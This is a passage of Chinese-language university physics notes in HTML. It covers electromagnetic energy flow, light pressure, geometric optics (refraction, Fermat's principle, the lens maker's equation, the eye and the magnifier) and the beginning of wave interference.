    \mu_E=\dfrac{1}{2} \varepsilon_0 E^2 = \dfrac{1}{2} \varepsilon c^2B^2 =  \dfrac{1}{2} \dfrac{B^2}{\mu_0} = \mu_B
\]</div>
<p>故总能量密度(单位时间，单位体积)为</p>
<div class="arithmatex">\[
    \mu = \mu_E + \mu_B =  2 \mu_E = \varepsilon_0 E^2 
\]</div>
</div>
<div class="admonition key-point">
<p class="admonition-title"><span class="arithmatex">\(I\)</span> 与 <span class="arithmatex">\(\mu\)</span> 的关系</p>
<p><div align=center>
<img src="../NOTE/Physics/img/mx5.png" width=60%/>
</div></p>
</div>
<details class="example">
<summary>Example</summary>
<p><div align=center>
<img src="../NOTE/Physics/img/mx6.png" width=60%/>
</div></p>
</details>
<h3 id="note-physics-maxwell-_8">电路中的能量传输<a class="headerlink" href="#note-physics-maxwell-_8" title="Permanent link">&para;</a></h3>
<div align=center>
    <img src="../NOTE/Physics/img/mx7.png" width=60%/>
</div>

<p>如图的一个直流电路</p>
<div align=center>
    <img src="../NOTE/Physics/img/mx8.png" width=60%/>
</div>

<p>考虑与电源正极相连的导线，导线内部有一个电场，那么导线外部一定也有一个方向相同的电场,这是因为</p>
<div class="arithmatex">\[
   \oint \boldsymbol{E} \cdot \boldsymbol{dl} = -\dfrac{d\Phi_B}{dt} =0
\]</div>
<p>再加上一个垂直导线的电场，根据<span class="arithmatex">\(S=E \times H\)</span>，我们可以得到能量流动的方向，一方面流向电阻，另外一方面被导线消耗</p>
<p>与电源负极相连的导线也是类似的；</p>
<div align=center>
    <img src="../NOTE/Physics/img/mx9.png" width=40%/>
</div>

<h3 id="note-physics-maxwell-_9">电磁波蕴含的力<a class="headerlink" href="#note-physics-maxwell-_9" title="Permanent link">&para;</a></h3>
<div align=center>
    <img src="../NOTE/Physics/img/mx10.png" width=60%/>
</div>

<p>首先假设其有一个力<span class="arithmatex">\(\Delta F\)</span>，那么这个力会对电荷做功，即<span class="arithmatex">\(\Delta W = \Delta F \cdot \Delta l\)</span>;而这一部分功就是这个物体吸收的净能量;</p>
<div class="arithmatex">\[
\Delta \boldsymbol{F} \cdot c \Delta t = (\boldsymbol{S_{in}} - \boldsymbol{S_{out}}) \cdot \Delta A \Delta t
\]</div>
<p>故</p>
<div class="arithmatex">\[
\Delta \boldsymbol{F} = \dfrac{1}{c} (\boldsymbol{S_{in}} - \boldsymbol{S_{out}}) \Delta A
\]</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>注意是矢量减</p>
</div>
<h4 id="note-physics-maxwell-light-pressure">光压(light pressure)<a class="headerlink" href="#note-physics-maxwell-light-pressure" title="Permanent link">&para;</a></h4>
<p>单位面积上的力</p>
<div class="arithmatex">\[
    P = \dfrac{1}{c} (\boldsymbol{S_{in}} - \boldsymbol{S_{out}})
\]</div>
<h4 id="note-physics-maxwell-_10">动量密度<a class="headerlink" href="#note-physics-maxwell-_10" title="Permanent link">&para;</a></h4>
<p>单位体积内的动量</p>
<div class="arithmatex">\[
    \Delta g  = \dfrac{F \cdot \Delta t}{\Delta A c \Delta t} = \dfrac{F}{c \Delta A} = \dfrac{1}{c^2}(\boldsymbol{S_{in}} - \boldsymbol{S_{out}})
\]</div>
<p><span class="arithmatex">\(g_{in}=\dfrac{1}{c^2}S_{in}\)</span> 为入射光的动量密度，<span class="arithmatex">\(g_{out}=\dfrac{1}{c^2}S_{out}\)</span> 为反射光的动量密度</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>对于白体，<span class="arithmatex">\(S_{in}=S_{out}\)</span>，故<span class="arithmatex">\(g_{in}=g_{out}\)</span></p>
<div class="arithmatex">\[
    P = \dfrac{2}{c} \boldsymbol{S_{in}}
\]</div>
<p>对于黑体，<span class="arithmatex">\(S_{out}=0\)</span>，故<span class="arithmatex">\(g_{in}=\dfrac{1}{c^2}S_{in}\)</span></p>
<div class="arithmatex">\[
    P = \dfrac{1}{c} \boldsymbol{S_{in}}
\]</div>
</div></section><section class="print-page" id="note-physics-light" heading-number="2.3.4.6"><h1 id="note-physics-light-_1">光学<a class="headerlink" href="#note-physics-light-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8317 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 63 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 29 分钟</p>
</div>
<h2 id="note-physics-light-_2">可见光<a class="headerlink" href="#note-physics-light-_2" title="Permanent link">&para;</a></h2>
<p>在电磁波中，可见光只占了很小一部分</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light1.png" width="70%">
</div>

<div class="admonition property">
<p class="admonition-title">Property</p>
<ul>
<li>可见光波长范围：<span class="arithmatex">\(400nm-700nm\)</span></li>
<li>可见光频率范围：<span class="arithmatex">\(4.3\times10^{14}Hz-7.5\times10^{14}Hz\)</span></li>
<li>可见光波长与频率的关系：<span class="arithmatex">\(\lambda f=c\)</span></li>
<li>人眼最敏感的波长<span class="arithmatex">\(550nm\)</span>左右为黄绿光</li>
<li>波长越长，频率越低，能量越低,所以红光能量最低，紫光能量最高</li>
<li></li>
</ul>
</div>
<h3 id="note-physics-light-_3">波的多普勒效应<a class="headerlink" href="#note-physics-light-_3" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
f'=\dfrac{v\pm v_0}{v\pm v_s}f
\]</div>
<p>其中，<span class="arithmatex">\(v\)</span>为波在介质中的传播速度，波源速度为<span class="arithmatex">\(v_s\)</span>，接收者速度为<span class="arithmatex">\(v_0\)</span>，<span class="arithmatex">\(f\)</span>为波的频率</p>
<p>对于光波，有红移和蓝移</p>
<ul>
<li>红移：波源远离接收者，波长变长，频率变小，光谱向红色移动</li>
</ul>
<div class="arithmatex">\[
    f=f_0 \sqrt{\dfrac{1-\frac{u}{c}}{1+\frac{u}{c}}}
\]</div>
<ul>
<li>蓝移：波源靠近接收者，波长变短，频率变大，光谱向蓝色移动</li>
</ul>
<div class="arithmatex">\[
    f=f_0 \sqrt{\dfrac{1+\frac{u}{c}}{1-\frac{u}{c}}}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>通式为</p>
<div class="arithmatex">\[
    f = f_0 \dfrac{\sqrt{1-\frac{u^2}{c^2}}}{1-\frac{u}{c}\cos \theta}
\]</div>
<p>其中<span class="arithmatex">\(\theta\)</span>为速度与光波运动的夹角</p>
</div>
<h2 id="note-physics-light-_4">几何光学<a class="headerlink" href="#note-physics-light-_4" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-light-_5">全反射<a class="headerlink" href="#note-physics-light-_5" title="Permanent link">&para;</a></h3>
<p>全反射是光波在传播过程中发生的一种物理现象。当光从光密介质（如玻璃或水）进入光疏介质（如空气）时，如果入射角大于某个临界角（称为临界角），光就不会发生折射，而是全部被反射回光密介质，这种现象称为全反射</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light2.png" width="70%">
</div>

<p>例如，在玻璃中，<span class="arithmatex">\(n=1.5\)</span>，在空气中，<span class="arithmatex">\(n_0=1\)</span>;又有</p>
<div class="arithmatex">\[
   \dfrac{\sin \theta_2}{\sin \theta_1}=\dfrac{n_1}{n_2}
\]</div>
<p>临界角为<span class="arithmatex">\(\theta_2 = 90^\circ\)</span>，所以此时</p>
<div class="arithmatex">\[
    \sin \theta_c = \dfrac{n_2}{n_1}
\]</div>
<p>如果入射角大于临界角，光就会发生全反射，被束缚在光密介质中,在这个例子中，临界角为<span class="arithmatex">\(\theta_c = \arcsin \dfrac{1}{1.5} = 41.8^\circ\)</span></p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>求折射率,可以通过以下公式求解</p>
<div class="arithmatex">\[
    n = \dfrac{\sin \theta_1}{\sin \theta_2}
\]</div>
<p>其中<span class="arithmatex">\(\theta_1\)</span>为空气中入射角，<span class="arithmatex">\(\theta_2\)</span>为折射角</p>
</div>
<h3 id="note-physics-light-_6">色散<a class="headerlink" href="#note-physics-light-_6" title="Permanent link">&para;</a></h3>
<p>**色散现象**是指当白光或复色光通过介质（如棱镜、光栅）时，不同波长的光由于折射率不同而发生不同程度的偏折，从而使光被分解成各种单色光的现象。它是光的波动特性的一种表现，主要由介质的**折射率随波长的变化**引起。</p>
<div class="arithmatex">\[
n = \frac{c}{v}
\]</div>
<p>由于 <span class="arithmatex">\( v \)</span> 与波长 <span class="arithmatex">\( \lambda \)</span> 相关，介质对不同波长的光折射率不同，导致折射角不同。通常情况下：</p>
<ul>
<li>短波长光（如紫光）折射率较大，偏折角较大。</li>
<li>长波长光（如红光）折射率较小，偏折角较小。</li>
</ul>
<p>这种波长依赖性导致了色散。</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light3.png" width="70%">
</div>

<h3 id="note-physics-light-_7">惠更斯原理<a class="headerlink" href="#note-physics-light-_7" title="Permanent link">&para;</a></h3>
<div class="admonition summary">
<p class="admonition-title">定理内容</p>
<p>波前上的每一个点都可以看作是新的球面波（次波）源，这些次波相干叠加后形成了波的传播方向和波前。</p>
</div>
<div align=center>
<img src="../NOTE/Physics/img/light/light4.png" width="30%">
</div>

<div class="admonition example">
<p class="admonition-title">惠更斯原理证明光的反射与折射</p>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light5.png" width="50%">
</div></p>
<p><strong>反射</strong></p>
<p>证明三角形全等，运用等角互余</p>
<div class="arithmatex">\[
A_1 C_1 = A_n B_n = v_1 t_n
\]</div>
<div class="arithmatex">\[
\Delta A_1 C_1 B_n \cong \Delta B_n A_n A_1
\]</div>
<div class="arithmatex">\[
\therefore \angle A_n A_1 B_n = \angle C_1 B_n A_1
\]</div>
<div class="arithmatex">\[
\Rightarrow i_1' = i_1 
\]</div>
<p><strong>折射</strong></p>
<div class="arithmatex">\[
\angle D_1B_nA_1 = i_2
\]</div>
<div class="arithmatex">\[
\sin i_2 = \frac{A_1D_1}{A_1B_n}
\]</div>
<div class="arithmatex">\[
\sin i_1 = \frac{A_nB_n}{A_1B_n}
\]</div>
<div class="arithmatex">\[
\therefore \frac{\sin i_1}{\sin i_2} = \frac{A_nB_n}{A_1D_1} = \frac{v_1 t}{v_2 t} = \frac{v_1}{v_2}
\]</div>
<p>再运用</p>
<div class="arithmatex">\[
    v=\dfrac{c}{n}
\]</div>
<p>带入即可</p>
</div>
<h3 id="note-physics-light-_8">费马原理<a class="headerlink" href="#note-physics-light-_8" title="Permanent link">&para;</a></h3>
<p>光程定义为</p>
<div class="arithmatex">\[
    L = n_1 s_1 + n_2 s_2
\]</div>
<p>其中<span class="arithmatex">\(n_1\)</span>和<span class="arithmatex">\(n_2\)</span>分别为两个介质的折射率，<span class="arithmatex">\(s_1\)</span>和<span class="arithmatex">\(s_2\)</span>分别为两个介质中光线的实际路径长度</p>
<p>积分形式为</p>
<div class="arithmatex">\[
    L = \int n ds
\]</div>
<p>费马原理是指光线在传播过程中，若可以成像，则光程的变分为零(对某一个变量求偏导为零)</p>
<p>即</p>
<div class="arithmatex">\[
    \delta \int n ds = 0
\]</div>
<div class="admonition example">
<p class="admonition-title">费马原理证明反射和折射</p>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light6.png" width="50%">
</div></p>
<div class="arithmatex">\[
L = \sqrt{a^2 + x^2} + \sqrt{b^2 + (d - x)^2}
\]</div>
<div class="arithmatex">\[
\frac{dL}{dx} = \frac{1}{2} \cdot \frac{2x}{\sqrt{a^2 + x^2}} - \frac{1}{2} \cdot \frac{2(d - x)}{\sqrt{b^2 + (d - x)^2}} = 0
\]</div>
<div class="arithmatex">\[
\frac{x}{\sqrt{a^2 + x^2}} = \frac{(d - x)}{\sqrt{b^2 + (d - x)^2}}
\]</div>
<div class="arithmatex">\[
\sin \theta_1 = \sin \theta_1' \quad \theta_1 = \theta_1'
\]</div>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light7.png" width="50%">
</div></p>
<div class="arithmatex">\[
L = n_1 \sqrt{a^2 + x^2} + n_2 \sqrt{b^2 + (d - x)^2}
\]</div>
<div class="arithmatex">\[
\frac{dL}{dx} = \frac{1}{2} n_1 \frac{2x}{\sqrt{a^2 + x^2}} - \frac{1}{2} n_2 \frac{2(d - x)}{\sqrt{b^2 + (d - x)^2}} = 0
\]</div>
<div class="arithmatex">\[
n_1 \frac{x}{\sqrt{a^2 + x^2}} = n_2 \frac{(d - x)}{\sqrt{b^2 + (d - x)^2}}, \quad n_1 \sin \theta_1 = n_2 \sin \theta_2
\]</div>
</div>
<h2 id="note-physics-light-image-formation">成像(Image Formation)<a class="headerlink" href="#note-physics-light-image-formation" title="Permanent link">&para;</a></h2>
<div align=center>
<img src="../NOTE/Physics/img/light/light8.png" width="50%">
</div>

<p>成像的基本原则是等光程</p>
<p>左边称为物方，右边称为像方</p>
<h3 id="note-physics-light-_9">球面镜成像<a class="headerlink" href="#note-physics-light-_9" title="Permanent link">&para;</a></h3>
<p>C为球心;r为球半径;</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light9.png" width="50%">
</div>

<p>首先，使用正弦定理</p>
<div class="arithmatex">\[
\begin{cases}
\dfrac{p}{\sin \phi} = \dfrac{o + r}{\sin \theta} = \dfrac{r}{\sin u} \\
\dfrac{p'}{\sin \phi} = \dfrac{i - r}{\sin \theta'} = \dfrac{r}{\sin u'}
\end{cases}
\]</div>
<div class="arithmatex">\[
\begin{align*}
n \sin \theta &amp;= n' \sin \theta' \\
\theta - u &amp;= \theta' + u' = \phi
\end{align*}
\]</div>
<div class="arithmatex">\[
\begin{cases}
\dfrac{p}{o + r} = \dfrac{\sin \phi}{\sin \theta} \\
\dfrac{p'}{i - r} = \dfrac{\sin \phi}{\sin \theta'}
\end{cases}
\]</div>
<div class="arithmatex">\[
\therefore \frac{p}{n(o + r)} = \frac{p'}{n'(i - r)}
\]</div>
<p>使用余弦定理</p>
<div class="arithmatex">\[
\begin{cases}
p^2 = (o + r)^2 + r^2 - 2r(o + r) \cos \phi = o^2 + 4r(o + r) \sin^2 \frac{\phi}{2} \\
p'^2 = (i - r)^2 + r^2 + 2r(i - r) \cos \phi = i^2 - 4r(i - r) \sin^2 \frac{\phi}{2}
\end{cases}
\]</div>
<div class="arithmatex">\[
\cos \phi = 1 - 2 \sin^2 \frac{\phi}{2}
\]</div>
<div class="arithmatex">\[
\Rightarrow \frac{o^2}{n^2(o + r)^2} - \frac{i^2}{n'^2(i - r)^2} = -4r \sin^2 \frac{\phi}{2} \left[ \frac{1}{n^2(o + r)} + \frac{1}{n'^2(i - r)} \right]
\]</div>
<p>不同的<span class="arithmatex">\(\phi\)</span>对应不同的成像位置,球面不能成像；</p>
<p>唯一可能的位置为两边为0；</p>
<div class="arithmatex">\[
\begin{cases}
\dfrac{o^2}{n^2(o + r)^2} - \dfrac{i^2}{n'^2(i - r)^2} = 0 \\
\dfrac{1}{n^2(o + r)} + \dfrac{1}{n'^2(i - r)} = 0
\end{cases}
\]</div>
<p>或者使用旁轴近似,即<span class="arithmatex">\(\phi\)</span>很小,右边为0；</p>
<div class="arithmatex">\[
\frac{o^2}{n^2(o + r)^2} = \frac{i^2}{n'^2(i - r)^2}
\]</div>
<div class="arithmatex">\[
\frac{n(o + r)}{o} = \frac{n'(i - r)}{i}
\]</div>
<mark class="critic block">
<div class="arithmatex">\[
\frac{n'}{i} + \frac{n}{o} = \frac{n' - n}{r}
\]</div>
</mark>
<p>又有</p>
<div class="arithmatex">\[
\begin{cases}
i \to \infty, \quad o = f = \dfrac{n}{n' - n} r \\
o \to \infty, \quad i = f' = \dfrac{n'}{n' - n} r
\end{cases}
\]</div>
<div class="arithmatex">\[
\dfrac{f}{f'} = \dfrac{n}{n'}, \quad \dfrac{f}{o} + \dfrac{f'}{i} = 1
\]</div>
<div class="admonition note">
<p class="admonition-title">符号的约定</p>
<ul>
<li><span class="arithmatex">\(o\)</span>,实为+，虚为-(Q，在左为+，右为-)</li>
<li><span class="arithmatex">\(i\)</span>,实为+，虚为-(Q'，在左为-，右为+)</li>
<li><span class="arithmatex">\(r\)</span>,凸为+，凹为-(C,在左为-，右为+)</li>
</ul>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light10.png" width="50%">
</div></p>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light11.png" width="50%">
</div></p>
</div>
<h3 id="note-physics-light-_10">球面镜反射<a class="headerlink" href="#note-physics-light-_10" title="Permanent link">&para;</a></h3>
<div align=center>
<img src="../NOTE/Physics/img/light/light12.png" width="50%">
</div>

<div class="arithmatex">\[
n \sin \theta = n' \sin \theta' \quad \text{if } \theta &gt; 0, \text{ then } \theta' &lt; 0
\]</div>
<div class="arithmatex">\[
n = -n'
\]</div>
<div class="arithmatex">\[
f = \frac{n}{n' - n} r = -\frac{r}{2}
\]</div>
<div class="arithmatex">\[
f' = \frac{n'}{n' - n} r = \frac{1}{2} r
\]</div>
<p>带入折射公式</p>
<div class="arithmatex">\[
\Rightarrow \frac{1}{o} + \frac{1}{i} = -\frac{2}{r}
\]</div>
<p>如果是平面镜，那么<span class="arithmatex">\(r \to \infty\)</span>，成虚像；</p>
<h3 id="note-physics-light-_11">放大倍数<a class="headerlink" href="#note-physics-light-_11" title="Permanent link">&para;</a></h3>
<div align=center>
<img src="../NOTE/Physics/img/light/light13.png" width="50%">
</div>

<p>首先，由旁轴近似</p>
<div class="arithmatex">\[
    n \sin \theta = n' \sin \theta' \Rightarrow  n \theta = n' \theta'
\]</div>
<p><span class="arithmatex">\(y'&lt;0\)</span></p>
<div class="arithmatex">\[
y \approx o \cdot \theta, \, -y' = i \cdot \theta'
\]</div>
<div class="arithmatex">\[
\therefore m = \frac{y'}{y} = -\frac{i\theta'}{o\theta} = -\frac{n \cdot i}{n' \cdot o}
\]</div>
<p>如果<span class="arithmatex">\(n=n'\)</span>，则<span class="arithmatex">\(m=-\dfrac{i}{o}\)</span> 负号表示倒像</p>
<h3 id="note-physics-light-_12">薄透镜成像<a class="headerlink" href="#note-physics-light-_12" title="Permanent link">&para;</a></h3>
<div align=center>
<img src="../NOTE/Physics/img/light/light24.png" width="50%">
</div>

<p>首先，对于<span class="arithmatex">\(n\)</span>和<span class="arithmatex">\(n_L\)</span>,<span class="arithmatex">\(n_L\)</span>和<span class="arithmatex">\(n'\)</span>，分别使用球面镜成像公式</p>
<div class="arithmatex">\[
\begin{cases} 
\frac{f_1'}{i_1} + \frac{f_1}{o_1} = 1  \\ 
\frac{f_2'}{i_2} + \frac{f_2}{o_2} = 1 
\end{cases}
\]</div>
<p>其中</p>
<div class="arithmatex">\[
\begin{aligned}
f_1 &amp;= \frac{n}{n_L - n} r_1, \quad f_1' = \frac{n_L}{n_L - n} r_1 \\
f_2 &amp;= \frac{n_L}{n' - n_L} r_2, \quad f_2' = \frac{n'}{n' - n_L} r_2
\end{aligned}
\]</div>
<p><span class="arithmatex">\(o_2\)</span>是Q经过第一个球面镜的虚像像距,所以</p>
<div class="arithmatex">\[
-o_2 = i_1 - d, \quad o_2 = d - i_1
\]</div>
<p>对于(1)式两边同时乘以<span class="arithmatex">\(f_2\)</span>，对于(2)式两边同时乘以<span class="arithmatex">\(f_1'\)</span></p>
<div class="arithmatex">\[
\begin{cases} 
\frac{f_1' f_2}{i_1} + \frac{f_1 f_2}{o_1} = f_2 \\ 
\frac{f_1' f_2'}{i_2} + \frac{f_1' f_2}{-i_1} = f_1'
\end{cases}
\]</div>
<p>相加</p>
<div class="arithmatex">\[
\frac{f_1' f_2'}{i_2} + \frac{f_1 f_2}{o_1} = f_1' + f_2
\]</div>
<div class="arithmatex">\[
\frac{f_1' f_2'}{i} + \frac{f_1 f_2}{o} = f_1' + f_2
\]</div>
<p>除过去,得到</p>
<div class="arithmatex">\[
\frac{f'}{i} + \frac{f}{o} = 1
\]</div>
<p>其中，令</p>
<div class="arithmatex">\[
    f' = \frac{f_1' f_2'}{f_1' + f_2}
\]</div>
<div class="arithmatex">\[
    f = \frac{f_1 f_2}{f_1' + f_2}
\]</div>
<h4 id="note-physics-light-lens-makers-equation">磨镜者公式(Lens Maker's Equation)<a class="headerlink" href="#note-physics-light-lens-makers-equation" title="Permanent link">&para;</a></h4>
<div class="arithmatex">\[
f' = \frac{f_1' f_2'}{f_1' + f_2} = \frac{\frac{n_L}{n_L - n} \cdot \frac{n'}{n' - n_L} r_1 r_2}{\frac{n_L}{n_L - n} r_1 + \frac{n'}{n' - n_L} r_2} = \frac{n'}{\frac{n_L - n}{r_1} + \frac{n' - n_L}{r_2}}
\]</div>
<div class="arithmatex">\[
f = \frac{f_1 f_2}{f_1' + f_2} = \frac{\frac{n}{n_L - n} \cdot \frac{n_L}{n' - n_L} r_1 r_2}{\frac{n_L}{n_L - n} r_1 + \frac{n_L}{n' - n_L} r_2} = \frac{n}{\frac{n_L - n}{r_1} + \frac{n' - n_L}{r_2}}
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    \dfrac{f'}{f} = \dfrac{n'}{n}
\]</div>
<p>如果<span class="arithmatex">\(n=n'=1\)</span>，则<span class="arithmatex">\(f' = f\)</span></p>
<div class="arithmatex">\[
f = f' = \frac{1}{(n_L - 1) \left( \frac{1}{r_1} - \frac{1}{r_2} \right)}
\]</div>
<p>如果<span class="arithmatex">\(f'和f\)</span>都为正，则透镜为凸透镜，反之<span class="arithmatex">\(f，f'\)</span>为负，则透镜为凹透镜</p>
<h4 id="note-physics-light-_13">符号约定<a class="headerlink" href="#note-physics-light-_13" title="Permanent link">&para;</a></h4>
<div align=center>
<img src="../NOTE/Physics/img/light/light25.png" width="70%">
</div>

<ul>
<li>如果 <span class="arithmatex">\(Q\)</span> 在 <span class="arithmatex">\(F\)</span> 点的左侧，<span class="arithmatex">\(x &gt; 0\)</span></li>
<li>如果 <span class="arithmatex">\(Q\)</span> 在 <span class="arithmatex">\(F\)</span> 点的右侧，<span class="arithmatex">\(x &lt; 0\)</span></li>
<li>如果 <span class="arithmatex">\(Q'\)</span> 在 <span class="arithmatex">\(F'\)</span> 点的左侧，<span class="arithmatex">\(x' &lt; 0\)</span></li>
<li>如果 <span class="arithmatex">\(Q'\)</span> 在 <span class="arithmatex">\(F'\)</span> 点的右侧，<span class="arithmatex">\(x' &gt; 0\)</span></li>
</ul>
<div class="arithmatex">\[
o = f + x
\]</div>
<div class="arithmatex">\[
i = f' + x'
\]</div>
<div class="arithmatex">\[
\frac{1}{f + x} + \frac{1}{f' + x'} = \frac{1}{f}
\]</div>
<p>可以化简为</p>
<div class="arithmatex">\[
xx' = ff'
\]</div>
<h4 id="note-physics-light-_14">横向放大倍数与屈光度<a class="headerlink" href="#note-physics-light-_14" title="Permanent link">&para;</a></h4>
<div align=center>
<img src="../NOTE/Physics/img/light/light13.png" width="70%">
</div>

<p>对于单个镜面，放大倍数为</p>
<div class="arithmatex">\[
m_1 = -\dfrac{ni_1}{n_L o_1}, \quad m_2 = -\dfrac{n i_2}{n' o_2}
\]</div>
<p>其中<span class="arithmatex">\(o_2\)</span>是Q经过第一个球面镜的虚像像距,是负的；</p>
<div class="arithmatex">\[
m = m_1 m_2 = \dfrac{n i_1}{n_L o_1} \cdot \dfrac{n_L i_2}{n' o_2} = \dfrac{n i_1}{n_L o_1} \cdot \dfrac{n_L i}{n' (-i_1)} = -\dfrac{n i}{n' o} = -\dfrac{fi}{f' o}
\]</div>
<p>定义屈光度</p>
<div class="arithmatex">\[
D = \dfrac{1}{f}
\]</div>
<p>眼镜度数定义为100D；</p>
<h3 id="note-physics-light-_15">人眼成像<a class="headerlink" href="#note-physics-light-_15" title="Permanent link">&para;</a></h3>
<p>人眼最近可以看清的距离为25cm，最远可以看清的距离为无穷远；</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light26.png" width="70%">
</div>

<div class="arithmatex">\[
\frac{1}{250 \, \text{mm}} + \frac{1}{25 \, \text{mm}} = \frac{1}{f}
\]</div>
<p>此时<span class="arithmatex">\(f = 22.7mm\)</span></p>
<p>看无穷远时,<span class="arithmatex">\(d_o = \infty, d_i = 25mm\)</span>,此时<span class="arithmatex">\(f = 25mm\)</span></p>
<div class="admonition idea">
<p class="admonition-title">近视眼和远视眼可以抵消吗？</p>
<p>近视眼和远视眼不能抵消，近视眼是看不清无穷远，成像在视网膜前方，远视眼是看不清25cm，成像在视网膜后方；两者都是因为人的晶状体变化跟不上，如果同时有近视眼和远视眼，可能只能看到特定距离的物体；</p>
</div>
<h4 id="note-physics-light-_16">放大镜<a class="headerlink" href="#note-physics-light-_16" title="Permanent link">&para;</a></h4>
<p>对于很小的物体，我们可以把它凑得离眼睛很近，但是这样对晶状体的压力很大，所以我们使用放大镜，凑得很近的时候，利用放大镜成一个放大的虚像</p>
<p>例如，原本在<span class="arithmatex">\(N\)</span>的地方有一个小物体，高度为<span class="arithmatex">\(d_0\)</span></p>
<div align=center>
<img src="../NOTE/Physics/img/light/light27.png" width="60%">
</div>

<div class="arithmatex">\[
    \tan \theta = \frac{h_0}{N} \sim \theta = \frac{h_0}{N}
\]</div>
<p>利用放大镜</p>
<div align=center>
<img src="../NOTE/Physics/img/light/light28.png" width="60%">
</div>

<div class="arithmatex">\[
\text{Compare to unaided eye:} \quad \theta = \frac{h_0}{N}, \quad \theta' = \frac{h_i}{d_i} = \frac{h_o}{d_o}
\]</div>
<p>放大倍数</p>
<div class="arithmatex">\[
M = \frac{\theta'}{\theta} = \frac{h_o/d_o}{h_o/N} = \frac{N}{d_o}
\]</div>
<p>对于该放大镜</p>
<div class="arithmatex">\[
\frac{1}{d_o} + \frac{1}{d_i} = \frac{1}{f} \quad \Rightarrow \quad \frac{1}{d_o} = \frac{1}{f} - \frac{1}{d_i}
\]</div>
<p>我们要把像成在N处，<span class="arithmatex">\(d_i\)</span>是虚像，所以<span class="arithmatex">\(-d_i = N\)</span></p>
<p>也就是说</p>
<div class="arithmatex">\[
\frac{1}{d_o} = \frac{1}{f} + \frac{1}{N}
\]</div>
<p>得到放大倍数为</p>
<div class="arithmatex">\[
M = \frac{N}{d_o} = N(\frac{1}{f} + \frac{1}{N}) = \frac{N}{f}+1
\]</div>
<h2 id="note-physics-light-_17">波动光学<a class="headerlink" href="#note-physics-light-_17" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-light-interference">光的干涉(Interference)<a class="headerlink" href="#note-physics-light-interference" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-light-_18">光的叠加<a class="headerlink" href="#note-physics-light-_18" title="Permanent link">&para;</a></h4>
<p>电场强度 <span class="arithmatex">\(E\)</span> 的振动在空间的传播可以表示为：</p>
<div class="arithmatex">\[
E = E_0 \cos(\omega t + \varphi_1 - 2\pi \frac{x}{\lambda})
\]</div>
<p>对于两列光波的叠加：</p>
<ul>
<li><span class="arithmatex">\(\omega_1 = \omega_2 = \omega\)</span></li>
<li><span class="arithmatex">\(E_1 = E_{10} \cos(\omega t + \varphi_{10})\)</span></li>
<li><span class="arithmatex">\(E_2 = E_{20} \cos(\omega t + \varphi_{20})\)</span></li>
</ul>
<p>叠加电场：</p>
<div class="arithmatex">\[
E = E_1 + E_2
\]</div>
<div align=center>
<img src="../NOTE/Physics/img/light/light14.png" width="70%">
</div>
<div align=center>
<img src="../NOTE/Physics/img/light/light15.png" width="70%">
</div>

<ul>
<li>同相位：<span class="arithmatex">\(\Delta \varphi = 0\)</span>,相干，in phase</li>
<li>反相位：<span class="arithmatex">\(\Delta \varphi = \pi\)</span>，out of phase</li>
</ul>
<div class="admonition note">
<p class="admonition-title">复平面矢量推导</p>
<p>对于两列光波的叠加：</p>
<ul>
<li><span class="arithmatex">\(\omega_1 = \omega_2 = \omega\)</span></li>
<li><span class="arithmatex">\(E_1 = E_{10} \cos(\omega t + \varphi_{10})\)</span></li>
<li><span class="arithmatex">\(E_2 = E_{20} \cos(\omega t + \varphi_{20})\)</span></li>
</ul>
<p>叠加电场：</p>
<div class="arithmatex">\[
E = E_1 + E_2 = E_0 \cos(\omega t + \varphi_0)
\]</div>
<p>光强：</p>
<div class="arithmatex">\[
I_0 = E_0^2 = E_{10}^2 + E_{20}^2 + 2E_{10}E_{20}\cos\Delta\varphi
\]</div>
<p>其中，<span class="arithmatex">\(\Delta\varphi = \varphi_{20} - \varphi_{10}\)</span></p>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light16.png" width="60%"/>
</div></p>
</div>
<div class="admonition info">
<p class="admonition-title">干涉的光强分布</p>
<p>干涉现象的光强分布可以表示为：</p>
<div class="arithmatex">\[
I = I_1 + I_2 + 2\sqrt{I_1 I_2} \cos \Delta \varphi
\]</div>
